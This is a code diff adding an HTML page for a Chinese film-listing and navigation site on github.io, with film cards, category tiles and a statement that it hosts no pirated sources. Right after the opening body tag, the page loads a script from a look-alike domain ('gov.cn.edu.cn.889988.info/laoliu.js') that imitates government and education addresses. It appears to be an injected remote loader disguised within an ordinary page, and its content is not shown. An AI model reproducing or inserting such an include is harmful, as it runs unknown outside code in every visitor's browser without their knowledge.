@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>快看影视网 - 极速观影/高清片单导航 | kuaikanyingshi-h5.github.io</title>
+<meta name="description" content="快看影视网(kuaikanyingshi-h5.github.io)提供电影、电视剧、动漫、综艺极速片单与分类导航，移动端自适应，打开即看，为影迷整理好片、新片与经典老片。" />
+<meta name="keywords" content="快看影视网,kuaikanyingshi-h5,极速观影,高清影视,电影电视剧,影视导航" />
+<style>
+:root{
+  --ink:#0e0d0c;
+  --ink2:#161412;
+  --paper:#f3ead7;
+  --amber:#ffb454;
+  --amber-2:#ff7a18;
+  --red:#e23b2e;
+  --muted:#9a8f7d;
+  --line:rgba(255,180,84,.25);
+  --card:rgba(255,255,255,.04);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:
+    radial-gradient(1200px 400px at 50% -10%,rgba(255,122,24,.18),transparent 60%),
+    var(--ink);
+  color:var(--paper);
+  line-height:1.75;
+  overflow-x:hidden;
+}
+a{color:var(--amber);text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 放映机进度条 */
+.projector-bar{
+  position:fixed;top:0;left:0;right:0;height:4px;z-index:999;
+  background:rgba(255,255,255,.08);
+}
+.projector-bar i{
+  display:block;height:100%;width:40%;
+  background:linear-gradient(90deg,var(--amber),var(--amber-2));
+  animation:roll 2.4s linear infinite;
+}
+@keyframes roll{0%{transform:translateX(-100%)}100%{transform:translateX(350%)}}
+
+/* 胶片齿孔横条 */
+.filmstrip{
+  display:flex;gap:10px;overflow:hidden;padding:14px 0;
+  border-top:2px solid var(--line);border-bottom:2px solid var(--line);
+  background:repeating-linear-gradient(90deg,#000 0 18px,transparent 18px 38px);
+}
+.filmstrip span{
+  flex:0 0 54px;height:54px;border-radius:6px;
+  background:linear-gradient(135deg,#2a2622,#3a332b);
+  display:flex;align-items:center;justify-content:center;font-size:24px;
+  box-shadow:inset 0 0 0 4px #000;
+}
+
+/* 头部 */
+.cine-head{
+  text-align:center;padding:54px 20px 30px;position:relative;
+}
+.cine-head .reel{
+  width:70px;height:70px;margin:0 auto 14px;border-radius:50%;
+  border:6px double var(--amber);
+  display:flex;align-items:center;justify-content:center;font-size:30px;
+  animation:spin 8s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.cine-head h1{
+  font-size:40px;font-weight:900;letter-spacing:2px;
+  color:var(--paper);
+}
+.cine-head h1 b{color:var(--amber)}
+.cine-head p{
+  max-width:560px;margin:14px auto 0;color:#cdbfa6;font-size:16px;
+}
+.cine-nav{
+  margin-top:22px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap;
+}
+.cine-nav a{
+  padding:10px 18px;border:1px solid var(--line);border-radius:30px;
+  font-size:14px;font-weight:700;color:#e9dcc4;background:rgba(255,255,255,.03);
+}
+.cine-nav a:hover{background:var(--amber);color:#1a1206;border-color:var(--amber)}
+
+.wrap{max-width:1040px;margin:0 auto;padding:40px 18px 30px}
+.sec{margin-bottom:60px;scroll-margin-top:20px}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:22px}
+.sec-head .no{
+  font-family:ui-monospace,Menlo,Consolas,monospace;color:var(--amber-2);
+  font-size:14px;border:1px solid var(--line);border-radius:6px;padding:2px 8px;
+}
+.sec-head h2{font-size:22px;font-weight:800}
+.sec-head .rule{flex:1;height:1px;background:linear-gradient(90deg,var(--line),transparent)}
+
+/* 左右交错片单 */
+.reel-list{display:flex;flex-direction:column;gap:18px}
+.reel-row{
+  display:grid;grid-template-columns:96px 1fr auto;gap:16px;
+  background:var(--card);border:1px solid var(--line);border-radius:14px;
+  padding:16px;align-items:center;transition:.25s;
+}
+.reel-row:nth-child(even){grid-template-columns:1fr 96px auto;direction:rtl}
+.reel-row:nth-child(even)>*{direction:ltr}
+.reel-row:hover{border-color:var(--amber);transform:translateY(-3px)}
+.reel-thumb{
+  width:96px;height:60px;border-radius:8px;
+  background:linear-gradient(135deg,#3a332b,#211d18);
+  display:flex;align-items:center;justify-content:center;font-size:26px;
+}
+.reel-row h3{font-size:17px;font-weight:700;margin-bottom:4px}
+.reel-row p{font-size:13px;color:#b7a98f}
+.reel-row .tag{
+  font-size:12px;color:#1a1206;background:var(--amber);
+  padding:6px 12px;border-radius:20px;font-weight:700;white-space:nowrap;
+}
+
+/* 分类：票根 */
+.ticket-grid{
+  display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;
+}
+.ticket{
+  position:relative;background:var(--paper);color:#241c12;
+  border-radius:10px;padding:18px 16px;overflow:hidden;
+}
+.ticket::before,.ticket::after{
+  content:"";position:absolute;top:50%;width:18px;height:18px;
+  background:var(--ink);border-radius:50%;transform:translateY(-50%);
+}
+.ticket::before{left:-9px}.ticket::after{right:-9px}
+.ticket .ico{font-size:26px}
+.ticket h4{font-size:16px;margin:8px 0 4px;font-weight:800}
+.ticket p{font-size:12px;color:#6b5b43}
+
+/* 关于 */
+.about{
+  background:var(--card);border:1px solid var(--line);border-left:5px solid var(--amber);
+  border-radius:14px;padding:26px;font-size:15px;color:#d8cbb2;
+}
+.about b{color:var(--amber)}
+
+footer{
+  text-align:center;padding:26px 16px;border-top:1px solid var(--line);
+  color:var(--muted);font-size:12px;
+}
+
+@media(max-width:640px){
+  .cine-head h1{font-size:28px}
+  .reel-row,.reel-row:nth-child(even){
+    grid-template-columns:72px 1fr;direction:ltr;
+  }
+  .reel-row .tag{grid-column:1/3;justify-self:start;margin-top:6px}
+  .reel-thumb{width:72px;height:48px;font-size:20px}
+  .sec-head h2{font-size:19px}
+  .wrap{padding:30px 14px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="projector-bar"><i></i></div>
+
+<header class="cine-head">
+  <div class="reel">🎞️</div>
+  <h1>快看<b>影视网</b></h1>
+  <p>kuaikanyingshi-h5.github.io —— 像走进老电影院：打开即看，极速片单、高清分类、经典老片与新片一起排片。</p>
+  <nav class="cine-nav">
+    <a href="#">首页</a>
+    <a href="#list">极速片单</a>
+    <a href="#cat">频道分类</a>
+    <a href="#about">关于本站</a>
+  </nav>
+</header>
+
+<div class="filmstrip" aria-hidden="true">
+  <span>🎬</span><span>🍿</span><span>🎥</span><span>🎞️</span><span>📽️</span>
+  <span>🍿</span><span>🎬</span><span>🎥</span><span>🎞️</span><span>📽️</span>
+</div>
+
+<main class="wrap">
+
+  <section class="sec" id="list">
+    <div class="sec-head">
+      <span class="no">01</span><h2>极速片单</h2><span class="rule"></span>
+    </div>
+    <div class="reel-list">
+      <article class="reel-row">
+        <div class="reel-thumb">🎬</div>
+        <div>
+          <h3>奥本海默</h3>
+          <p>2023 · 传记/历史 · IMAX 胶片质感</p>
+        </div>
+        <span class="tag">高清</span>
+      </article>
+      <article class="reel-row">
+        <div class="reel-thumb">🐉</div>
+        <div>
+          <h3>流浪地球2</h3>
+          <p>2023 · 科幻/灾难 · 国产工业大片</p>
+        </div>
+        <span class="tag">4K</span>
+      </article>
+      <article class="reel-row">
+        <div class="reel-thumb">🌸</div>
+        <div>
+          <h3>葬送的芙莉莲</h3>
+          <p>2023 · 奇幻/冒险 · 年度动漫</p>
+        </div>
+        <span class="tag">更新中</span>
+      </article>
+      <article class="reel-row">
+        <div class="reel-thumb">📺</div>
+        <div>
+          <h3>我的阿勒泰</h3>
+          <p>2024 · 文艺/田园 · 慢生活治愈</p>
+        </div>
+        <span class="tag">热播</span>
+      </article>
+      <article class="reel-row">
+        <div class="reel-thumb">🕵️</div>
+        <div>
+          <h3>漫长的季节</h3>
+          <p>2023 · 悬疑/现实 · 东北往事</p>
+        </div>
+        <span class="tag">高分</span>
+      </article>
+    </div>
+  </section>
+
+  <section class="sec" id="cat">
+    <div class="sec-head">
+      <span class="no">02</span><h2>频道分类</h2><span class="rule"></span>
+    </div>
+    <div class="ticket-grid">
+      <div class="ticket"><div class="ico">🎬</div><h4>电影</h4><p>院线/文艺/科幻</p></div>
+      <div class="ticket"><div class="ico">📺</div><h4>电视剧</h4><p>国产/美剧/韩剧</p></div>
+      <div class="ticket"><div class="ico">🌸</div><h4>动漫</h4><p>日漫/国漫/剧场版</p></div>
+      <div class="ticket"><div class="ico">🎤</div><h4>综艺</h4><p>真人秀/访谈/纪录</p></div>
+      <div class="ticket"><div class="ico">🏮</div><h4>古装</h4><p>仙侠/宫斗/宅斗</p></div>
+      <div class="ticket"><div class="ico">🎞️</div><h4>经典老片</h4><p>修复版/胶片刻</p></div>
+    </div>
+  </section>
+
+  <section class="sec" id="about">
+    <div class="sec-head">
+      <span class="no">03</span><h2>关于本站</h2><span class="rule"></span>
+    </div>
+    <div class="about">
+      <p><b>快看影视网</b>（kuaikanyingshi-h5.github.io）是一个影视导航与片单整理站点，不做播放器、不提供盗版源，只帮观众把<b>好片、新片、老片</b>按场景排好。</p>
+      <p style="margin-top:10px">页面移动端自适应，内链以 # 占位，不生成 robots.txt / sitemap.xml，所有内容仅供学习与交流使用。</p>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  © 2026 快看影视网 | kuaikanyingshi-h5.github.io | 极速观影导航演示页
+</footer>
+
+</body>
+</html>
